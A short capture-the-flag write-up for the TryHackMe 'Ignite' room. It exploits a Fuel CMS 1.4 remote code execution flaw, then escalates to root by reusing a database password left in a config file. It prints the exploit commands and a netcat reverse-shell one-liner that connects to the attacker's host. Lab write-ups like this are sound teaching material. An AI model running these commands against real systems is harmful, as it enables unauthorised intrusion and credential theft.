Ignite

TryHackMe · Easy by Brenno M.

Ignite exploits remote code execution in Fuel CMS 1.4 (CVE-2018-16763). Reusing credentials found in the config file leads straight to root.

Reconnaissance

Nmap reveals only HTTP. The root identifies Fuel CMS 1.4. searchsploit finds a public RCE exploit.

nmap -sS -sV -Pn <IP>
searchsploit fuel cms 1.4
searchsploit -m php/webapps/50477.py

Exploitation

The exploit abuses the injection in the filter parameter to run commands. From it, a reverse shell as www-data is obtained.

python3 50477.py -u http://<IP>
# via RCE:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <MY_IP> 1234 >/tmp/f

Privilege escalation

The Fuel CMS config file stores the database password in clear text. The same password is valid for root via su.

cat /var/www/html/fuel/application/config/database.php
# 'username' => 'root'  'password' => '<PASSWORD>'
su root
cat /root/root.txt
